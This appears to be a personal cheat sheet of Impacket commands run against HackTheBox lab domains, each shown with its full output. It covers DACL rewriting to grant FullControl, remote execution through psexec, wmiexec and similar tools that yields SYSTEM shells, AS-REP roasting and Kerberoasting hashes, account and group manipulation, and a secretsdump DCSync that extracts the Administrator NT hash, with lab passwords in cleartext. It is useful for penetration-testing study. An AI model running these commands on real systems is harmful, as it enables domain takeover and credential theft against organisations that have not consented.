## dacledit
```sh
└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action write -rights FullControl -ace-type allowed 'htb.local/svc-alfresco:s3rvice' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 20:59:36] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-17 20:59:42] [+] Initializing domainDumper()
[2025-08-17 20:59:43] [+] Target principal found in LDAP (DC=HTB,DC=LOCAL)
[2025-08-17 20:59:44] [+] Found principal SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-08-17 20:59:44] [+] Appending ACE (S-1-5-21-3072663084-364016917-1341370565-1147 --(FullControl)--> None)
[2025-08-17 20:59:44] [+] ACE created.
[2025-08-17 20:59:44] [*] DACL backed up to dacledit-20250817-205944.bak
[2025-08-17 20:59:44] [+] Attempts to modify the Security Descriptor.
[2025-08-17 20:59:44] [*] DACL modified successfully!


└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action read -ace-type allowed 'htb.local/svc-alfresco:s3rvice' -debug                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 21:05:09] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-17 21:05:16] [+] Initializing domainDumper()
[2025-08-17 21:05:16] [+] Target principal found in LDAP (DC=HTB,DC=LOCAL)
[2025-08-17 21:05:17] [+] Found principal SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-08-17 21:05:17] [*] Parsing DACL
[2025-08-17 21:05:47] [*] Printing parsed DACL
[2025-08-17 21:05:47] [*] Filtering results for SID (S-1-5-21-3072663084-364016917-1341370565-1147)
[2025-08-17 21:05:47] [*]   ACE[116] info                
[2025-08-17 21:05:47] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
[2025-08-17 21:05:47] [*]     ACE flags                 : None
[2025-08-17 21:05:47] [*]     Access mask               : FullControl (0xf01ff)
[2025-08-17 21:05:47] [*]     Trustee (SID)             : svc-alfresco (S-1-5-21-3072663084-364016917-1341370565-1147)


└─$ impacket-dacledit -ts -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' -action remove -rights FullControl -ace-type allowed 'htb.local/svc-alfresco:s3rvice' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-17 21:00:25] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-17 21:00:31] [+] Initializing domainDumper()
[2025-08-17 21:00:32] [+] Target principal found in LDAP (DC=HTB,DC=LOCAL)
[2025-08-17 21:00:32] [+] Found principal SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-08-17 21:00:32] [+] ACE created.
[2025-08-17 21:00:32] [+] This ACE will be removed
[2025-08-17 21:00:32] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
[2025-08-17 21:00:32] [*]     ACE flags                 : None
[2025-08-17 21:00:32] [*]     Access mask               : FullControl (0xf01ff)
[2025-08-17 21:00:32] [*]     Trustee (SID)             : svc-alfresco (S-1-5-21-3072663084-364016917-1341370565-1147)
[2025-08-17 21:00:32] [*] DACL backed up to dacledit-20250817-210032.bak
[2025-08-17 21:00:32] [+] Attempts to modify the Security Descriptor.
[2025-08-17 21:00:33] [*] DACL modified successfully!
```



## exec
### atexec
```sh
└─$ impacket-atexec -ts 'active.htb/administrator:Ticketmaster1968@10.129.172.255' whoami -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 09:17:21] [!] This will work ONLY on Windows >= Vista
[2025-07-28 09:17:21] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 09:17:25] [*] Creating task \EDdbKsEL
[2025-07-28 09:17:26] [*] Running task \EDdbKsEL
[2025-07-28 09:17:27] [+] Calling SchRpcGetLastRunInfo for \EDdbKsEL
[2025-07-28 09:17:27] [*] Deleting task \EDdbKsEL
[2025-07-28 09:17:28] [*] Attempting to read ADMIN$\Temp\EDdbKsEL.tmp
nt authority\system

[2025-07-28 09:17:30] [+] Deleting file ADMIN$\Temp\EDdbKsEL.tmp
```
### dcomexec
```sh
└─$ impacket-dcomexec -share 'C$' -ts -object 'MMC20' -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 09:12:29] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 09:12:31] [*] SMBv2.1 dialect used
[2025-07-28 09:12:33] [+] Target system is 10.129.172.255 and isFQDN is False
[2025-07-28 09:12:33] [+] StringBinding: DC[51092]
[2025-07-28 09:12:33] [+] StringBinding: 10.129.172.255[51092]
[2025-07-28 09:12:33] [+] StringBinding chosen: ncacn_ip_tcp:10.129.172.255[51092]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
active\administrator

C:\>exit
```
### psexec
```sh
└─$ impacket-psexec -ts 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:15:11] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:15:11] [+] StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]
[2025-07-28 08:15:14] [*] Requesting shares on 10.129.172.255.....
[2025-07-28 08:15:17] [*] Found writable share ADMIN$
[2025-07-28 08:15:17] [*] Uploading file ISoEJWvP.exe
[2025-07-28 08:15:20] [*] Opening SVCManager on 10.129.172.255.....
[2025-07-28 08:15:22] [*] Creating service CEiG on 10.129.172.255.....
[2025-07-28 08:15:23] [*] Starting service CEiG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> exit
[2025-07-28 08:17:19] [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[2025-07-28 08:17:19] [*] Opening SVCManager on 10.129.172.255.....
[2025-07-28 08:17:21] [*] Stopping service CEiG.....
[2025-07-28 08:17:22] [*] Removing service CEiG.....
[2025-07-28 08:17:28] [*] Removing file ISoEJWvP.exe.....
```
### smbexec
```sh
└─$ impacket-smbexec -share 'C$' -ts -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:18:09] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:18:09] [+] StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]
[2025-07-28 08:18:13] [+] Executing %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\BpZcNLCs.bat & %COMSPEC% /Q /c %SYSTEMROOT%\BpZcNLCs.bat & del %SYSTEMROOT%\BpZcNLCs.bat
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>whoami
[2025-07-28 08:18:30] [+] Executing %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\TQtkUbvS.bat & %COMSPEC% /Q /c %SYSTEMROOT%\TQtkUbvS.bat & del %SYSTEMROOT%\TQtkUbvS.bat
nt authority\system

C:\Windows\system32>exit
```
### wmiexec
```sh
└─$ impacket-wmiexec -share 'C$' -ts -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:13:20] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:13:23] [*] SMBv2.1 dialect used
[2025-07-28 08:13:25] [+] Target system is 10.129.172.255 and isFQDN is False
[2025-07-28 08:13:25] [+] StringBinding: \\\\DC[\\PIPE\\atsvc]
[2025-07-28 08:13:25] [+] StringBinding: DC[49154]
[2025-07-28 08:13:25] [+] StringBinding: 10.129.172.255[49154]
[2025-07-28 08:13:25] [+] StringBinding chosen: ncacn_ip_tcp:10.129.172.255[49154]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
active\administrator

C:\>exit
```



## GetNPUsers
```sh
└─$ impacket-GetNPUsers -outputfile asreproast.txt -ts -dc-ip '10.129.95.180' -no-pass 'EGOTISTICAL-BANK.LOCAL/fsmith' -debug 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-30 06:27:34] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-30 06:27:34] [*] Getting TGT for fsmith
[2025-07-30 06:27:34] [+] Trying to connect to KDC at 10.129.95.180:88
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b86517133043618f4b6aca6f0d97bed5$96e50d70ac316a65c724862915e51eca0ee6868fb128ec0f6dc46efded57f0de86e75e1d75ce72a6a737057053c6eb2644092bab36a64d97590e4682c5f3e452e6ff7be00aa3810edc8b0981357c0f9ed143e5c20a02b04b58f199b68f40aa4f4328a832efc773c94d942cb32bdc276037db142fe021438fb1a2d062fb482c40546358f94192c1cf7ae9738eb78478860ca40fb4d1ceaceb945ea7c563ce6bf71a426b952a3c9c22c27af78cca5e1d72c86778f8d7c0d43b1b56fe2bbb75baeba1bbe46d90e5ff26fb8f92406826c743e5975a731f0b4febb109c4ef91b12b62f65ff146718b6d3ecea6756e57c3e7dd5ce8e8fdbc1743854ec9f0dfc0cbc62f


└─$ impacket-GetNPUsers -outputfile asreproast.txt -ts -dc-ip '10.129.95.180' -usersfile user.txt 'EGOTISTICAL-BANK.LOCAL/' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-30 06:07:02] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-30 06:07:02] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:03] [+] Server time (UTC): 2025-07-30 17:07:03
[2025-07-30 06:07:03] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:03] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:04] [+] Server time (UTC): 2025-07-30 17:07:05
[2025-07-30 06:07:04] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:04] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:05] [+] Server time (UTC): 2025-07-30 17:07:06
[2025-07-30 06:07:05] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:05] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:07] [+] Server time (UTC): 2025-07-30 17:07:08
[2025-07-30 06:07:07] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:07] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:08] [+] Server time (UTC): 2025-07-30 17:07:09
[2025-07-30 06:07:08] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:08] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:10] [+] Server time (UTC): 2025-07-30 17:07:10
[2025-07-30 06:07:10] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:10] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:11] [+] Server time (UTC): 2025-07-30 17:07:11
[2025-07-30 06:07:11] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:11] [+] Trying to connect to KDC at 10.129.95.180:88
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4699f27f29b6ed010a42b58819aabf16$2d55add04f0cd69b29f78000be8544a4e8ec80488c2bc64a49c800b1ae0dee20b0125b949fae1c99085049f81101e1a3ebba19c58dae47fc4c4f3f9fb19dc828ffddf24a2a4a131a51117f927d9ddb3db283eea2fb49f215fdfe42368f08ae866313b177105a8dbfd1e495f911e1a646a0ddecd94744e5a63f068e39e593c0d2faf7fc5cdff30e8e94247a4270744a55e7f7407655d08f6ae4cec29a270f037124c905cbe8f66a82a63cf13486c40e1c84aee33c105e5c006710868ccaee87bd44b83a6a315065f1a4cf6f3230ac119d64d24fdef08c49458d0c14ea655d73a02056f1b30d8a66f980b8f3d7db419be3076aadabd98832932ad43fa704633eea
[2025-07-30 06:07:13] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:14] [+] Server time (UTC): 2025-07-30 17:07:14
[2025-07-30 06:07:14] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[2025-07-30 06:07:14] [+] Trying to connect to KDC at 10.129.95.180:88
[2025-07-30 06:07:15] [+] Server time (UTC): 2025-07-30 17:07:16
[2025-07-30 06:07:15] [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```



## GetUserSPNs
```sh
└─$ impacket-GetUserSPNs -outputfile svc_tgs.txt -ts -dc-ip 10.129.247.58 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-06 01:27:47] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-06 01:27:47] [+] Connecting to 10.129.247.58, port 389, SSL False
[2025-08-06 01:27:48] [+] Total of records returned 4
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-06 01:22:40.863350             



[2025-08-06 01:27:48] [-] CCache file is not found. Skipping...
[2025-08-06 01:27:48] [+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
[2025-08-06 01:27:48] [+] Trying to connect to KDC at 10.129.247.58:88
[2025-08-06 01:27:48] [+] Trying to connect to KDC at 10.129.247.58:88
[2025-08-06 01:27:49] [+] Trying to connect to KDC at 10.129.247.58:88
```



## net
### net user
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug user
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Enumerating users ..
  1. Administrator (500)
  2. Guest (501)
  3. krbtgt (502)
  4. DefaultAccount (503)
  5. $331000-VK4ADACQNUCA (1123)
  6. SM_2c8eef0a09b545acb (1124)
  7. SM_ca8c2ed5bdab4dc9b (1125)
  8. SM_75a538d3025e4db9a (1126)
  9. SM_681f53d4942840e18 (1127)
  10. SM_1b41c9286325456bb (1128)
  11. SM_9b69f1b9d2cc45549 (1129)
  12. SM_7c96b981967141ebb (1130)
  13. SM_c75ee099d0a64c91b (1131)
  14. SM_1ffab36a2f5f479cb (1132)
  15. HealthMailboxc3d7722 (1134)
  16. HealthMailboxfc9daad (1135)
  17. HealthMailboxc0a90c9 (1136)
  18. HealthMailbox670628e (1137)
  19. HealthMailbox968e74d (1138)
  20. HealthMailbox6ded678 (1139)
  21. HealthMailbox83d6781 (1140)
  22. HealthMailboxfd87238 (1141)
  23. HealthMailboxb01ac64 (1142)
  24. HealthMailbox7108a4e (1143)
  25. HealthMailbox0659cc1 (1144)
  26. sebastien (1145)
  27. lucinda (1146)
  28. svc-alfresco (1147)
  29. andy (1150)
  30. mark (1151)
  31. santi (1152)
```
#### net user -name
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug user -name administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
User name                      Administrator
Full name                      Administrator
Comment                        Built-in account for administering the computer/domain
User's comment                 
Country/region code            000 (System Default)
Account active                 Yes
Account expires                Never

Password last set              08/30/2021 20:51:58 PM
Password expires               Never
Password changeable            08/31/2021 20:51:58 PM
Password required              Yes
User may change password       Yes

Workstations allowed           All
Logon script                   
User profile                   
Home directory                 
Last logon                     09/01/2025 08:49:43 AM
Logon count                    143

Logon hours allowed            All

Local Group Memberships
  * Administrators
  * Users

Global Group memberships
  * Enterprise Admins
  * Organization Management
  * Domain Users
  * Group Policy Creator Owners
  * Domain Admins
  * Schema Admins
```
#### net user -create
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug user -create user01 -newPasswd '!QAZ2wsx'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Creating user account 'user01'
[+] user account created succesfully: user01:!QAZ2wsx
```
#### net user -remove
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug user -remove user01
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Deleting user account 'user01'
[+] user account deleted succesfully!
```
#### net user -enable
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug user -enable user01
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Enabling user account 'user01'
[+] user account enabled succesfully!
```
#### net user -disable
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug user -disable user01 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Disabling user account 'user01'
[+] user account disabled succesfully!
```
### net computer
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug computer
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Enumerating computers ..
  1. FOREST$ (1000)
  2. EXCH01$ (1103)
```
#### net computer -name
```sh
┌──(kali㉿kali)-[~]
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug computer -name 'FOREST$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
User name                      FOREST$
Full name                      
Comment                        
User's comment                 
Country/region code            000 (System Default)
Account active                 Yes
Account expires                Never

Password last set              09/01/2025 08:48:44 AM
Password expires               Never
Password changeable            09/02/2025 08:48:44 AM
Password required              Yes
User may change password       Yes

Workstations allowed           All
Logon script                   
User profile                   
Home directory                 
Last logon                     09/02/2025 00:48:39 AM
Logon count                    89

Logon hours allowed            All

Local Group Memberships

Global Group memberships
  * Domain Controllers
```
#### net computer -ceate
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug computer -create 'test$' -newPasswd '!QAZ2wsx'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Creating computer account 'test$'
[+] computer account created succesfully: test$:!QAZ2wsx
```
#### net computer -remove
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug computer -remove 'test$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Deleting computer account 'test$'
[+] computer account deleted succesfully!
```
#### net computer -enable
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug computer -enable 'test$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Enabling computer account 'test$'
[+] computer account enabled succesfully!
```
#### net computer -disable
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug computer -disable 'test$'                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Disabling computer account 'test$'
[+] computer account disabled succesfully!
```
### net localgroup
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug localgroup
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Enumerating localgroups ..
  1. Account Operators (548)
  2. Pre-Windows 2000 Compatible Access (554)
  3. Incoming Forest Trust Builders (557)
  4. Windows Authorization Access Group (560)
  5. Terminal Server License Servers (561)
  6. Administrators (544)
  7. Users (545)
  8. Guests (546)
  9. Print Operators (550)
  10. Backup Operators (551)
  11. Replicator (552)
  12. Remote Desktop Users (555)
  13. Network Configuration Operators (556)
  14. Performance Monitor Users (558)
  15. Performance Log Users (559)
  16. Distributed COM Users (562)
  17. IIS_IUSRS (568)
  18. Cryptographic Operators (569)
  19. Event Log Readers (573)
  20. Certificate Service DCOM Access (574)
  21. RDS Remote Access Servers (575)
  22. RDS Endpoint Servers (576)
  23. RDS Management Servers (577)
  24. Hyper-V Administrators (578)
  25. Access Control Assistance Operators (579)
  26. Remote Management Users (580)
  27. System Managed Accounts Group (581)
  28. Storage Replica Administrators (582)
  29. Server Operators (549)
```
#### net localgroup -name
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug localgroup -name administrators
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
  1. Administrator
  2. Enterprise Admins
  3. Domain Admins
```
#### net localgroup -join
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug localgroup -name Users -join test
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Adding user account 'test' to group 'Users'
[+] User account added to Users succesfully!
```
#### net localgroup -unjoin
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug localgroup -name Users -unjoin test
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Removing user account 'test' from group 'Users'
[+] User account removed from Users succesfully!
```
### net group
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug group     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Enumerating groups ..
  1. Enterprise Read-only Domain Controllers (498)
  2. Domain Admins (512)
  3. Domain Users (513)
  4. Domain Guests (514)
  5. Domain Computers (515)
  6. Domain Controllers (516)
  7. Schema Admins (518)
  8. Enterprise Admins (519)
  9. Group Policy Creator Owners (520)
  10. Read-only Domain Controllers (521)
  11. Cloneable Domain Controllers (522)
  12. Protected Users (525)
  13. Key Admins (526)
  14. Enterprise Key Admins (527)
  15. DnsUpdateProxy (1102)
  16. Organization Management (1104)
  17. Recipient Management (1105)
  18. View-Only Organization Management (1106)
  19. Public Folder Management (1107)
  20. UM Management (1108)
  21. Help Desk (1109)
  22. Records Management (1110)
  23. Discovery Management (1111)
  24. Server Management (1112)
  25. Delegated Setup (1113)
  26. Hygiene Management (1114)
  27. Compliance Management (1115)
  28. Security Reader (1116)
  29. Security Administrator (1117)
  30. Exchange Servers (1118)
  31. Exchange Trusted Subsystem (1119)
  32. Managed Availability Servers (1120)
  33. Exchange Windows Permissions (1121)
  34. ExchangeLegacyInterop (1122)
  35. $D31000-NSEL5BRJ63V7 (1133)
  36. Service Accounts (1148)
  37. Privileged IT Accounts (1149)
  38. test (5101)
```
#### net group -name
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug group -name 'Domain Admins'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
  1. Administrator
```
#### net group -join
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug group -name 'Domain Users' -join 'test'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Adding user account 'test' to group 'Domain Users'
[+] User account added to Domain Users succesfully!
```
#### net group -unjoin
```sh
└─$ impacket-net 'htb.local/svc-alfresco:s3rvice@10.129.138.203' -debug group -name 'Domain Users' -unjoin 'test'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Removing user account 'test' from group 'Domain Users'
[+] User account removed from Domain Users succesfully!
```



## netview
```sh
└─$ impacket-netview -target 10.129.138.203 -delay 30 -ts -debug 'htb.local/svc-alfresco:s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-01 13:13:06] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-01 13:13:06] [*] Importing targets
[2025-09-01 13:13:06] [*] Got 1 machines
[2025-09-01 13:13:06] [+] Sleeping for 30 seconds
[2025-09-01 13:13:06] [+] Currently monitoring 0 active targets
[2025-09-01 13:13:06] [+] 10.129.138.203: alive!
[2025-09-01 13:13:06] [+] up: 1, down: 0, total: 1
[2025-09-01 13:13:16] [+] up: 1, down: 0, total: 1
[2025-09-01 13:13:26] [+] up: 1, down: 0, total: 1
[2025-09-01 13:13:36] [+] Adding 10.129.138.203 to the up list
[2025-09-01 13:13:36] [+] up: 1, down: 0, total: 1
[2025-09-01 13:13:44] [*] 10.129.138.203: user HTB\Administrator logged in LOCALLY
[2025-09-01 13:13:44] [*] 10.129.138.203: user HTB\FOREST$ logged in LOCALLY

[2025-09-01 13:13:44] [+] Sleeping for 30 seconds
[2025-09-01 13:13:44] [+] Currently monitoring 1 active targets
[2025-09-01 13:13:46] [+] up: 1, down: 0, total: 1
[2025-09-01 13:13:56] [+] up: 1, down: 0, total: 1
[2025-09-01 13:14:06] [+] up: 1, down: 0, total: 1
[2025-09-01 13:14:15] [*] 10.129.138.203: user FOREST$ logged from host [fe80::f078:8d45:3c85:5444] - active: 7, idle: 1
[2025-09-01 13:14:15] [*] 10.129.138.203: user FOREST$ logged from host [::1] - active: 1, idle: 1

[2025-09-01 13:14:16] [+] Sleeping for 30 seconds
[2025-09-01 13:14:16] [+] Currently monitoring 1 active targets
[2025-09-01 13:14:16] [+] up: 1, down: 0, total: 1
[2025-09-01 13:14:26] [+] up: 1, down: 0, total: 1
[2025-09-01 13:14:36] [+] up: 1, down: 0, total: 1
[2025-09-01 13:14:46] [+] up: 1, down: 0, total: 1
[2025-09-01 13:14:47] [*] 10.129.138.203: user FOREST$ logged off from host [::1]

[2025-09-01 13:14:48] [+] Sleeping for 30 seconds
[2025-09-01 13:14:48] [+] Currently monitoring 1 active targets
^C[2025-09-01 13:14:50] [*] Quitting.. please wait
^CTraceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
    _thread_shutdown()
KeyboardInterrupt:
```



## secretdump
```sh
└─$ impacket-secretsdump -ts 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -debug                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-08 11:30:49] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-08 11:30:53] [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[2025-08-08 11:30:55] [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[2025-08-08 11:30:55] [*] Using the DRSUAPI method to get NTDS.DIT secrets
[2025-08-08 11:30:55] [+] Session resume file will be sessionresume_BeeTsklm
[2025-08-08 11:31:00] [+] Calling DRSGetNCChanges for S-1-5-21-2966785786-3096785034-1186376766-500 
[2025-08-08 11:31:01] [+] SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups
[2025-08-08 11:31:01] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-500 
[2025-08-08 11:31:01] [+] Calling DRSGetNCChanges for {21368e06-7c54-4cd5-9421-8186a6d29f66} 
[2025-08-08 11:31:02] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:02] [+] Decrypting hash for user: CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[2025-08-08 11:31:02] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:02] [+] Entering NTDSHashes.__decryptSupplementalInfo
